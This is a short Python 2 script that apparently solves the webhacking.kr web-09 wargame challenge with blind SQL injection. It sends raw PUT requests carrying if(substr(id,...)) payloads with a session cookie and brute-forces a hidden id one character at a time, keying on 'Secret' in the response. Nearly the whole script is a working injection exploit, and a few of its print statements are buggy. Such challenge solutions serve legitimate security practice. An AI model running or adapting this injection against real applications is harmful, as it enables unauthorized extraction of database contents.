import socket
import re

id=""
my_cookie="Cookie Value"

host="Host: webhacking.kr\n"
cookie="Cookie: PHPSESSID=%s\n\n" % my_cookie

web = 'webhacking.kr'
ip = socket.gethostbyname(web)

socket.setdefaulttimeout(5)

for i in range(1,12): 
    s = socket.socket()
    s.connect((ip, 80))
    for j in range(36,127):
#PUT /challenge/web/web-09/?no=if(substr(id,2,1)in(0x6c),3,0) HTTP/1.1
        head1="PUT /challenge/web/web-09/?no=if((substr(id,"
        head2="%d" % i
        head3=",1)in("
        head4=hex(j)
        head5=")),3,0) HTTP/1.1\n"
        s.send(head1+head2+head3+head4+head5+host+cookie)
        print(head1+head2+head3+head4+head5+host+cookie)
        aa=s.recv(1024)
        print("i: %d, j: %d (%s)") % (i, j, chr(j))
        find = re.findall("Secret",aa)

        if find:
            id+=chr(j)
            print "find ID: " + id
            break
    s.close()

print "no=3 id is %s" %(id)
